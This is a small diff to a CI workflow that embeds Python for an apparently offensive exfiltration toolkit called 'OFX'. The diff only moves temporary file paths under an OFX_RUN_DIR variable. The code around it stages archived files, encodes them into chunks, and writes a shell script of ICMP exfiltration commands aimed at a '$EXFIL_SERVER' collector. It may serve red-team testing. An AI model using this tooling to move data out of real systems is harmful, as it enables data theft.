@@ -59,7 +59,7 @@ jobs:
         else:
             original_size = sum(f.stat().st_size for f in src_path.rglob("*") if f.is_file())
 
-        staged_file = "/tmp/ofx_exfil_staged.tar.gz"
+        staged_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_exfil_staged.tar.gz"
         Path(staged_file).write_bytes(archived)
 
         ratio = (len(archived) / original_size * 100) if original_size > 0 else 0
@@ -112,7 +112,7 @@ jobs:
             print(f"[-] Unknown method: {method}")
             raise SystemExit(1)
 
-        encoded_file = "/tmp/ofx_exfil_encoded.json"
+        encoded_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_exfil_encoded.json"
         with open(encoded_file, "w") as f:
             json.dump({"method": method, "chunks": chunks}, f)
 
@@ -168,7 +168,7 @@ jobs:
             print(f"[+] Generated {len(commands)} ICMP exfil commands")
             print("    Set $EXFIL_SERVER to your collector address")
 
-        out_file = "/tmp/ofx_exfil_commands.sh"
+        out_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_exfil_commands.sh"
         with open(out_file, "w") as f:
             f.write("#!/bin/bash\n")
             f.write(f"# OFX Exfil Commands - method={method}\n")
